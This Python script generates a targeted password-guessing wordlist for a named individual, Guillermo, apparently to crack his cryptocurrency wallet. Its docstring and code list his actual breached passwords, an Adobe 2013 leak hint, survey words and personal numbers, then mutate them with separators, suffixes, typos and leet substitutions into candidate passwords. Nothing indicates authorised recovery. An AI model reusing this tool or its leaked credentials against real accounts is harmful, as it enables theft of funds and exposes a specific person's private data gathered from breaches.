#!/usr/bin/env python3
"""
Intelligent targeted wordlist generator for Guillermo's wallet password.

Generates candidates based on ALL confirmed intel:
- Known breach passwords: pera6luz, pera5luz*, pera5limon, Pera@chocolate5, pera%lus
- Confirmed: password contains billetera (Spanish for wallet)
- Adobe 2013 hint: 'como se hace la comida' (how food is made) -> asadera
- Survey words: pera, durazno/durasno, luz/lus, asadera/azadera, colimba, Yybju576
- Separators confirmed: digit(5-8), @, %, space, no-sep
- Suffix confirmed: * (pera5luz*)
- Numbers: 5,6,7,8, 56-5678 sequences, 69, 1969, 2013, 231661, 21
"""
import sys

FOOD_WORDS = [
    'pera','luz','lus','limon','chocolate','durazno','durasno',
    'asadera','asaderas','azadera','azaderas','colimba',
    'uva','naranja','manzana','damasco','ciruela','banana','tomate',
    'asado','vino','malbec','carne','leche','queso','huevo','arroz','maiz',
    'sal','aceite','ajo','harina','fuego','cocina','horno','parrilla',
    'comida','asando','cocinando',
]

WALLET_WORDS = ['billetera','monedero','cartera','billetes','billetero']

ALL_WORDS = FOOD_WORDS + WALLET_WORDS + [
    'bitcoin','Bitcoin','btc','BTC','satoshi','wallet','Wallet',
    'mendoza','Mendoza','river','riverplate','godoy','gutierrez',
    'notebook','internet','google','arielram',
    'mibilletera','mibitcoin','minotebook',
]

NUMBERS = [
    '5','6','7','8','9','0','1','2','3','4',
    '56','67','78','57','58','68','567','678','5678',
    '69','1969','2013','2012','2011','2010',
    '21','12','13','16','231661','23166','2316',
    '211169','21111969','211269','21121969',
]

SEPARATORS = ['','5','6','7','8','@','%',' ','.','-','_','0','1','2','3','4','9',
              '56','67','78','567','5678','69','1969','2013','231661']

SUFFIXES = ['','*','!','.',
            '5','6','7','8','56','67','78','567','5678',
            '69','1969','2013','231661','21','16',
            '5*','6*','7*','8*','5678*','69*',
            '@69','@2013','@5','@6','@7','@8',
            '%69','%5','%6',
]

Z2S = str.maketrans({'z':'s','Z':'S'})
S2Z = str.maketrans({'s':'z','S':'Z'})
LEET = str.maketrans({'a':'4','e':'3','i':'1','o':'0','s':'5','A':'4','E':'3','I':'1','O':'0','S':'5'})

def word_forms(w):
    forms = {w, w.lower(), w.upper(), w.capitalize()}
    base = list(forms)
    for f in base:
        forms.add(f.translate(Z2S))
        forms.add(f.translate(S2Z))
    for f in list(forms):
        forms.add(f.translate(LEET))
    return forms

seen = set()
out = []

def emit(c):
    if c and c not in seen and 2 <= len(c) <= 20:
        seen.add(c)
        out.append(c)

# 1) Exact known breach passwords and direct variants
known = [
    'pera6luz','pera5luz','pera7luz','pera8luz',
    'pera5luz*','pera6luz*','pera7luz*','pera8luz*',
    'pera5limon','pera6limon','pera7limon','pera8limon',
    'Pera@chocolate5','pera@chocolate5','Pera@chocolate6','pera@chocolate6',
    'pera@limon5','pera@limon6','Pera@limon5',
    'pera%lus','pera%luz','Pera%lus','Pera%luz',
    'arielram','Arielram','arielram69','Arielram69','arielram2013',
    'Yybju576','yybju576','YYBJU576','Yybju5678','yybju5678',
]
for pw in known:
    emit(pw)

# 2) CORE PATTERN: word + sep + billetera (and reversed), ALL word forms
for bill_form in word_forms('billetera') | word_forms('monedero') | word_forms('cartera'):
    for sep in SEPARATORS:
        for w in ALL_WORDS:
            for wf in word_forms(w):
                emit(wf + sep + bill_form)
                emit(bill_form + sep + wf)
    # billetera alone + all suffixes
    for suf in SUFFIXES:
        for bf in word_forms('billetera') | {'billetera','Billetera','BILLETERA','mibilletera','MiBilletera','miBilletera'}:
            emit(bf + suf)

# 3) pera-first pattern (confirmed: pera is ALWAYS first in breach) + all words + all seps
for pera_f in word_forms('pera'):
    for sep in SEPARATORS:
        for w in ALL_WORDS:
            for wf in word_forms(w):
                if wf != pera_f:
                    c = pera_f + sep + wf
                    emit(c)
                    # + trailing suffix
                    for suf in ['*','!','','5','6','7','8','69','5678','2013','231661']:
                        emit(c + suf)

# 4) Three-word patterns with billetera in any position
for sep1 in ['','5','6','7','8','@','%','5678']:
    for sep2 in ['','5','6','7','8','@','%','5678']:
        for w1 in ['pera','luz','lus','limon','asadera','durazno','colimba']:
            for bill in ['billetera','Billetera']:
                for w2 in ['pera','luz','lus','limon','asadera','durazno','colimba']:
                    if w1 != w2:
                        emit(w1 + sep1 + bill + sep2 + w2)
                        emit(bill + sep1 + w1 + sep2 + w2)
                        emit(w1 + sep1 + w2 + sep2 + bill)

# 5) Adobe hint: asadera/asaderas as THE word, with all patterns
for af in word_forms('asadera') | word_forms('asaderas') | word_forms('azadera') | word_forms('azaderas'):
    for suf in SUFFIXES:
        emit(af + suf)
    for sep in SEPARATORS:
        for bf in word_forms('billetera'):
            emit(af + sep + bf)
            emit(bf + sep + af)
        for nf in NUMBERS:
            emit(af + sep + nf)
            emit(nf + sep + af)

# 6) Typos of billetera
for typo in ['biletera','billetera','billtera','billetera','billetara','billetira',
             'bielletera','billetrea','billteraa','biilletera','billeetera']:
    for suf in ['','69','5678','231661','2013','1969','5','6','7','8','*','!']:
        emit(typo + suf)
    for sep in ['5','6','7','8','@','%']:
        for w in ['pera','luz','lus','limon']:
            emit(typo + sep + w)
            emit(w + sep + typo)

# 7) Specific combos: pera + ALL_WORDS with underscore/dot/dash separators
for sep in ['_','-','.']:
    for w2 in ALL_WORDS:
        for wf2 in word_forms(w2):
            emit('pera' + sep + wf2)
            emit('Pera' + sep + wf2)
            emit(wf2 + sep + 'billetera')
            emit(wf2 + sep + 'Billetera')
            for num in ['','69','2013','5678','231661']:
                emit('pera' + sep + wf2 + num)
                emit(wf2 + sep + 'billetera' + num)

# 8) miBilletera CamelCase variants (not generated by standard word_forms)
for mi_prefix in ['mi','Mi','MI']:
    for bill_core in ['billetera','Billetera','Bitcoin','bitcoin','Wallet','wallet']:
        base = mi_prefix + bill_core
        for suf in SUFFIXES:
            emit(base + suf)

# Output
print('\n'.join(out), file=sys.stdout)
sys.stderr.write(f'Generated {len(out)} targeted candidates\n')
